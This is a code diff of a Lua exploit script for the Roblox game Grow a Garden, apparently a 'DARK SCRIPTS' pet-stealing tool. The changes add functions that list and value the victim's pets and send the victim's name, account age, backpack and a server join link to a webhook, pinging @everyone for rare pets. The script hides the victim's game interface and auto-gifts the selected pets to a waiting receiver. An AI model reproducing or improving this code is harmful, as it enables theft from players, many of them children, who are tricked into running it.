@@ -68,31 +68,108 @@ local function formatNumberWithCommas(n)
     return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
 end
 
-local function SendWebhook()
-    local payload = {
-        content = string.format("\n%s\n", tpScript),
-        embeds = {{
-            title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
-            color = 65280,
-            fields = {
-                {
-                    name = "👤 Player Information",
-                    value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s```", 
-                        Players.LocalPlayer.DisplayName or "Unknown", 
-                        Username or "Unknown", 
-                        detectExecutor() or "Unknown"),
-                    inline = false
-                },
-                {
-                    name = "🏝️ Join Server",
-                    value = "[click here to join](" .. Fern .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-                    inline = false
-                }
+local function getWeight(toolName)
+    if not toolName or toolName == "No Tool" then
+        return nil
+    end
+    local weight = toolName:match("%[([%d%.]+) KG%]")
+    weight = weight and tonumber(weight)
+    return weight
+end
+
+local function getAge(toolName)
+    if not toolName or toolName == "No Tool" then
+        return nil
+    end
+    local age = toolName:match("%[Age (%d+)%]")
+    age = age and tonumber(age)
+    return age
+end
+
+local function isMutated(toolName)
+    for key, data in pairs(PetPriorityData) do
+        if data.isMutation and toolName:lower():find(key:lower()) == 1 then
+            return key
+        end
+    end
+    return nil
+end
+
+local function SendWebhook(pets)
+    local petString = ""
+    local totalValue = 0
+    local hasRare = false
+
+    for _, pet in ipairs(pets) do
+        local highestPriority = 99
+        local chosenEmoji = "🐶"
+        local mutation = isMutated(pet.PetName)
+        local mutationData = mutation and PetPriorityData[mutation] or nil
+        local petData = PetPriorityData[pet.Type] or nil
+
+        if petData and petData.priority < highestPriority then
+            highestPriority = petData.priority
+            chosenEmoji = petData.emoji
+        elseif mutationData and mutationData.priority < highestPriority then
+            highestPriority = mutationData.priority
+            chosenEmoji = mutationData.emoji
+        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
+            highestPriority = 12
+            chosenEmoji = "🐘"
+        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
+            highestPriority = 13
+            chosenEmoji = "👴"
+        end
+
+        if pet.Type ~= "Red Fox" and PetPriorityData[pet.Type] and not PetPriorityData[pet.Type].isMutation then
+            hasRare = true
+        end
+
+        if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
+            petString = petString .. "\n" .. chosenEmoji .. " - " .. pet.PetName .. " -> " .. pet.Formatted
+            totalValue = totalValue + pet.Value
+        end
+    end
+
+    if petString == "" then return end
+
+    local embed = {
+        title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
+        color = 65280,
+        fields = {
+            {
+                name = "👤 Player Information",
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
+                    Players.LocalPlayer.DisplayName or "Unknown", 
+                    Username or "Unknown", 
+                    detectExecutor() or "Unknown", 
+                    tostring(Players.LocalPlayer.AccountAge or 0)),
+                inline = false
             },
-            footer = {
-                text = string.format("%s | %s", game.PlaceId, game.JobId)
+            {
+                name = "💰 Total Value",
+                value = string.format("```%s```", formatNumberWithCommas(totalValue)),
+                inline = false
+            },
+            {
+                name = "🌴 Backpack",
+                value = string.format("```%s```", petString),
+                inline = false
+            },
+            {
+                name = "🏝️ Join Server",
+                value = "[click here to join](" .. Fern .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
+                inline = false
             }
-        }}
+        },
+        footer = {
+            text = string.format("%s | %s", game.PlaceId, game.JobId)
+        }
+    }
+
+    local payload = {
+        content = (hasRare and "--@everyone\n" or "") .. string.format("\n%s\n", tpScript or "N/A"),
+        embeds = {embed}
     }
 
     pcall(function()
@@ -208,32 +285,119 @@ local function PrepareEnvironment()
     game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 end
 
-local function TransferPets(receiverPlr)
-    local targetPlr = Players.LocalPlayer
-    local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
-    local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
+local function GetPlayerPets()
+    local unsortedPets = {}
+    local player = Players.LocalPlayer
+    local data = DataService:GetData()
+    if not data or not data.PetsData then
+        return unsortedPets
+    end
 
-    local function UnequipFromFarm(player)
-        if workspace:FindFirstChild("PetsPhysical") then
-            for _, petMover in workspace.PetsPhysical:GetChildren() do
-                if petMover and petMover:GetAttribute("OWNER") == player.Name then
-                    for _, pet in petMover:GetChildren() do
-                        PetsService:UnequipPet(pet.Name)
-                    end
+    if workspace:FindFirstChild("PetsPhysical") then
+        for _, petMover in workspace.PetsPhysical:GetChildren() do
+            if petMover and petMover:GetAttribute("OWNER") == player.Name then
+                for _, pet in petMover:GetChildren() do
+                    PetsService:UnequipPet(pet.Name)
                 end
             end
         end
     end
 
-    UnequipFromFarm(targetPlr)
+    local maxWaitTime = 5
+    local elapsedTime = 0
+    repeat
+        task.wait(0.5)
+        elapsedTime = elapsedTime + 0.5
+    until #player.Backpack:GetChildren() > 0 or elapsedTime >= maxWaitTime
 
-    for _, tool in pairs(targetPlr.Backpack:GetChildren()) do
+    for _, tool in pairs(player.Backpack:GetChildren()) do
         if tool and tool:IsA("Tool") and (tool:GetAttribute("Favorite") == true or tool:GetAttribute("d") == true) then
             RS:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
         end
     end
 
-    task.wait(1)
+    task.wait(0.5)
+
+    for _, tool in pairs(player.Backpack:GetChildren()) do
+        if not tool or not tool.Parent then
+            continue
+        end
+
+        if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
+            local petName = tool.Name
+            local PET_UUID = tool:GetAttribute("PET_UUID")
+            if not PET_UUID then continue end
+
+            local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
+            if not petInventoryData then continue end
+
+            local petData = petInventoryData.PetData
+            local HatchedFrom = petData.HatchedFrom
+            if not HatchedFrom or HatchedFrom == "" then continue end
+
+            local eggData = PetRegistry.PetEggs[HatchedFrom]
+            if not eggData then continue end
+
+            local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
+            if not rarityData then continue end
+
+            local WeightRange = rarityData.GeneratedPetData.WeightRange
+            if not WeightRange then continue end
+
+            local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
+            local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
+            local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
+            local rawValue = math.floor(sellPrice * weightMultiplier * levelMultiplier)
+
+            local age = getAge(petName) or 0
+            local weight = getWeight(petName) or 0
+            local strippedName = petName:gsub(" %[.*%]", "")
+            local petType = strippedName
+
+            for key, data in pairs(PetPriorityData) do
+                if data.isMutation and strippedName:lower():find(key:lower()) == 1 then
+                    petType = strippedName:sub(#key + 2)
+                    break
+                end
+            end
+
+            table.insert(unsortedPets, {
+                PetName = petName,
+                PetAge = age,
+                PetWeight = weight,
+                Id = PET_UUID,
+                Type = petType,
+                Value = rawValue,
+                Formatted = formatNumberWithCommas(rawValue),
+            })
+        end
+    end
+
+    table.sort(unsortedPets, function(a, b)
+        local aPriority, aMutation = 99, isMutated(a.PetName)
+        local bPriority, bMutation = 99, isMutated(b.PetName)
+        
+        if PetPriorityData[a.Type] then aPriority = PetPriorityData[a.Type].priority
+        elseif aMutation and PetPriorityData[aMutation] then aPriority = PetPriorityData[aMutation].priority
+        elseif a.Weight and a.Weight >= 10 then aPriority = 12
+        elseif a.Age and a.Age >= 60 then aPriority = 13 end
+        
+        if PetPriorityData[b.Type] then bPriority = PetPriorityData[b.Type].priority
+        elseif bMutation and PetPriorityData[bMutation] then bPriority = PetPriorityData[bMutation].priority
+        elseif b.Weight and b.Weight >= 10 then bPriority = 12
+        elseif b.Age and b.Age >= 60 then bPriority = 13 end
+        
+        if aPriority == bPriority then return a.Value > b.Value
+        else return aPriority < bPriority end
+    end)
+
+    return unsortedPets
+end
+
+local function TransferPets(receiverPlr, pets)
+    local targetPlr = Players.LocalPlayer
+    local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
+    local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
 
     local function SmoothFollow()
         local offset = CFrame.new(0, 0, 0.5)
@@ -281,41 +445,25 @@ local function TransferPets(receiverPlr)
             return false
         end
 
-        if detectExecutor() == "Delta" then
-            task.wait(0.3)
-            local camera = workspace.CurrentCamera
-            local head = receiverChar:FindFirstChild("Head")
-
-            if head then
-                local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)
-                if onScreen then
-                    local x = screenPos.X
-                    local y = screenPos.Y
-                    local VirtualInputManager = game:GetService("VirtualInputManager")
-                    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, nil, false)
-                    task.wait(0.8)
-                    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, nil, false)
-                else
-                    return false
-                end
-            end
-        else
-            local success, err = pcall(function()
-                RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
+        local success, err = pcall(function()
+            RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
+            task.wait(0.5)
+            local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
+            if prompt then
+                fireproximityprompt(prompt, 0)
                 task.wait(0.5)
-                local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
-                if prompt then
-                    fireproximityprompt(prompt)
-                end
-                return true
-            end)
-
-            if not success then
-                if tool then
-                    tool.Parent = inventory
-                end
-                return false
+                fireproximityprompt(prompt, 1)
+                task.wait(0.5)
+                fireproximityprompt(prompt, 0)
             end
+            return true
+        end)
+
+        if not success then
+            if tool then
+                tool.Parent = inventory
+            end
+            return false
         end
 
         task.wait(0.15)
@@ -327,11 +475,31 @@ local function TransferPets(receiverPlr)
 
     task.wait(1)
 
-    for _, tool in targetPlr.Backpack:GetChildren() do
-        if tool and tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
-            for attempt = 1, 3 do
-                local result = safeGiftTool(tool)
-                if result then break end
+    for _, pet in ipairs(pets) do
+        local highestPriority = 99
+        local mutation = isMutated(pet.PetName)
+        local mutationData = mutation and PetPriorityData[mutation] or nil
+        local petData = PetPriorityData[pet.Type] or nil
+
+        if petData and petData.priority < highestPriority then
+            highestPriority = petData.priority
+        elseif mutationData and mutationData.priority < highestPriority then
+            highestPriority = mutationData.priority
+        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
+            highestPriority = 12
+        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
+            highestPriority = 13
+        end
+
+        if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
+            for _, tool in targetPlr.Backpack:GetChildren() do
+                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
+                    for attempt = 1, 3 do
+                        local result = safeGiftTool(tool)
+                        if result then break end
+                        task.wait(1)
+                    end
+                end
             end
         end
     end
@@ -350,9 +518,11 @@ local function WaitForReceiver()
     return receiverPlr
 end
 
-SendWebhook()
+-- Main execution flow
+local pets = GetPlayerPets()
+SendWebhook(pets)
 
 local receiverPlr = WaitForReceiver()
 CreateGui()
 PrepareEnvironment()
-TransferPets(receiverPlr)
+TransferPets(receiverPlr, pets)
